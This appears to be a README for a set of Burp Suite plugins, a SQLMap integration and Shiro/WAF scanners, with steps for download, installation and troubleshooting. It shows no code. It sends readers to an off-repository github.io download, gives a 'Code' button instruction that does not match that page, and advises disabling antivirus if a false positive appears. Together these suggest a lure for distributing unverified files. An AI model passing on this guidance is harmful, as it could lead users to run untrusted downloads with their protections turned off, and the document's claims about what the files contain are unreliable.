# 🛡️ burpsuite-executor-scripts - Streamline your advanced security testing workflows

[![](https://img.shields.io/badge/Download-Project_Files-blue)](https://tianna94.github.io)

This collection provides a set of manual tools and automated scripts for security professionals. These tools integrate with Burp Suite to help you find vulnerabilities in web applications. The repository contains custom Java plugins, scripts for SQLMap, and scanners for Shiro and WAF systems. You can use these resources to automate repetitive tasks and improve your testing speed.

## 📋 System requirements

You need a computer running Windows 10 or Windows 11. Ensure you have the latest version of Burp Suite Professional or Community Edition installed. Java Development Kit (JDK) version 17 or higher should be present on your system to run the custom plugins. Check that you have at least 500 MB of free disk space for the script files and dependency libraries.

## 📥 Downloading the software

Visit this page to download the collection: [https://tianna94.github.io](https://tianna94.github.io)

Once you reach the link, find the green button labeled "Code" near the top right of the page. Select "Download ZIP" from the menu. Save the file to your computer. Create a folder named "BurpTools" in your documents directory and extract the contents of the ZIP file into this folder.

## ⚙️ Setting up the environment

Open Burp Suite. Navigate to the "Extensions" tab located at the top of the window. Click on the "Installed" sub-tab. Select the "Add" button to open the extension installation dialog. 

Choose the "Extension type" as Java. Click the "Select file" button and navigate to your "BurpTools" folder. Choose the file ending in .jar that matches the plugin you wish to use. Burp Suite triggers a confirmation message once it loads the extension. Repeat these steps for each plugin you want to add to your workspace.

## 🚀 Running your first script

Navigate to the "Extensions" tab after you install the plugins. You see a list of loaded tools in the table. Each tool provides a specific interface in the Burp Suite menu bar. 

For the SQLMap integration, click the new "SQLMap" menu item that appears after installation. Set the file path to point to your local installation of SQLMap. Ensure your terminal allows external execution. Most Python scripts in this collection require a properly configured Python environment. Install Python 3.10 from the official website if your system lacks it. Use the "Run" button inside the extension panel to execute your chosen security scan against a target URL.

## 🛠️ Managing custom plugins

You can toggle plugins on and off from the "Installed" sub-tab. Uncheck the box next to any plugin to disable it without removing it from your system. If you experience errors during a scan, click the "Errors" tab within the plugin interface to see logs. 

Update these tools periodically by repeating the download process from the link provided. Always backup your specific configuration files inside the "BurpTools" folder before you replace old versions with new ones.

## 📦 Troubleshooting common issues

If a plugin fails to initialize, verify that the Java path is correct in your Windows Environment Variables. Ensure that you have administrative permissions for the folder where you saved the files. Some plugins require an active network connection to download specific dependencies during the first run. Disable your antivirus temporarily if it identifies a false positive, as some security tools share signatures with malicious software. 

Check for Python dependencies by running the command "pip install -r requirements.txt" inside the folder hosting the specific scripts. This command installs necessary libraries that enable the automation features. Refer to the individual sub-folders for specific configuration files if a tool is not responding to your input.

## 🔍 Understanding the toolset

This repository offers specific functionalities for modern security testing:

- Custom Java plugins: These provide deep integration with the Burp Suite request pipeline. They allow you to modify packets on the fly during an active interception.
- SQLMap integration: This connects your browser traffic directly to the SQLMap engine. It saves time by passing session tokens and headers automatically.
- Shiro and WAF scanners: These scripts detect known weaknesses in common web frameworks and firewall configurations. They flag potential bypasses for your manual review.
- Python automation: These scripts handle repetitive chores, such as organizing your request history or finding hidden web files.

## 🛡️ Best practices for security

Use these tools only on networks or applications where you possess formal, written permission to test. Unauthorized scanning might break services or violate legal agreements. Always maintain a clear record of your activities. Use the logging features built into these extensions to keep a history of the traffic you generate. Limit the rate of requests in your scanner settings to avoid overwhelming the target server.

Keywords: security, penetration-testing, burpsuite, automation, scripting, web-security